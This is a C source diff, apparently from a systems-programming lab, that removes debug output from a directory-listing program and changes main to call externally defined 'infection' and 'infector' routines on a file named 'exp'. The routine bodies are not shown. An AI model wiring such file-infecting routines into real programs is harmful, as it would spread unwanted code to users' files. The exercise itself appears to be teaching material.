@@ -38,6 +38,8 @@ enum
 
 
 extern int system_call();
+extern void infection(void);
+extern void infector(char* name);
 
 struct linux_dirent {
   unsigned long  d_ino;     /* Inode number */
@@ -80,19 +82,6 @@ void printWithPrefix(char prefix)
  {
    system_call(1,0x55,"","");
  }
-
- system_call(SYS_WRITE,STDERR,itoa(SYS_GETDENTS),strlen(itoa(SYS_GETDENTS)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,itoa(folderDescriptor),strlen(itoa(folderDescriptor)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,buf,strlen(buf));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,itoa(BUF_SIZE),strlen(itoa(BUF_SIZE)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,itoa(nread),strlen(itoa(nread)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,"\n",1);
-
  for (bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *) (buf + bpos);
      if(d->d_name[0] == prefix)
@@ -111,19 +100,6 @@ void printWithPrefix(char prefix)
          system_call(SYS_CLOSE,folderDescriptor,"","");
          system_call(1,0x55,"","");
        }
-
-       system_call(SYS_WRITE,STDERR,itoa(SYS_WRITE),strlen(itoa(SYS_WRITE)));
-       system_call(SYS_WRITE,STDERR,"  ",2);
-       system_call(SYS_WRITE,STDERR,itoa(STDOUT),strlen(itoa(STDOUT)));
-       system_call(SYS_WRITE,STDERR,"  ",2);
-       system_call(SYS_WRITE,STDERR,d->d_name,strlen(d->d_name));
-       system_call(SYS_WRITE,STDERR,"  ",2);
-       system_call(SYS_WRITE,STDERR,itoa(strlen(d->d_name)),strlen(itoa(strlen(d->d_name))));
-       system_call(SYS_WRITE,STDERR,"  ",2);
-       system_call(SYS_WRITE,STDERR,itoa(writeSucces),strlen(itoa(writeSucces)));
-       system_call(SYS_WRITE,STDERR,"  ",2);
-       system_call(SYS_WRITE,STDERR,"\n",1);
-
        system_call(SYS_WRITE,STDOUT,"\n",1);
      }
      bpos += d->d_reclen;
@@ -152,21 +128,6 @@ void printWithoutPrefix()
    system_call(1,0x55,"","");
 
  }
-
-
- system_call(SYS_WRITE,STDERR,itoa(SYS_GETDENTS),strlen(itoa(SYS_GETDENTS)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,itoa(folderDescriptor),strlen(itoa(folderDescriptor)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,buf,strlen(buf));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,itoa(BUF_SIZE),strlen(itoa(BUF_SIZE)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,itoa(nread),strlen(itoa(nread)));
- system_call(SYS_WRITE,STDERR,"  ",2);
- system_call(SYS_WRITE,STDERR,"\n",1);
-
-
  for (bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *) (buf + bpos);
      writeSucces = system_call(SYS_WRITE,STDOUT,d->d_name,strlen(d->d_name));
@@ -183,19 +144,6 @@ void printWithoutPrefix()
        system_call(SYS_CLOSE,folderDescriptor,"","");
        system_call(1,0x55,"","");
      }
-
-     system_call(SYS_WRITE,STDERR,itoa(SYS_WRITE),strlen(itoa(SYS_WRITE)));
-     system_call(SYS_WRITE,STDERR,"  ",2);
-     system_call(SYS_WRITE,STDERR,itoa(STDOUT),strlen(itoa(STDOUT)));
-     system_call(SYS_WRITE,STDERR,"  ",2);
-     system_call(SYS_WRITE,STDERR,d->d_name,strlen(d->d_name));
-     system_call(SYS_WRITE,STDERR,"  ",2);
-     system_call(SYS_WRITE,STDERR,itoa(strlen(d->d_name)),strlen(itoa(strlen(d->d_name))));
-     system_call(SYS_WRITE,STDERR,"  ",2);
-     system_call(SYS_WRITE,STDERR,itoa(writeSucces),strlen(itoa(writeSucces)));
-     system_call(SYS_WRITE,STDERR,"  ",2);
-     system_call(SYS_WRITE,STDERR,"\n",1);
-
      system_call(SYS_WRITE,STDOUT,"\n",1);
      bpos += d->d_reclen;
   }
@@ -204,13 +152,7 @@ void printWithoutPrefix()
 
 int main (int argc , char* argv[], char* envp[])
 {
-  if(argc > 1 && argv[1][1] == 'p')
-  {
-    printWithPrefix(argv[1][2]);
-  }
-  else
-  {
-    printWithoutPrefix();
-  }
+  infection();
+  infector("exp");
   return 0;
 }
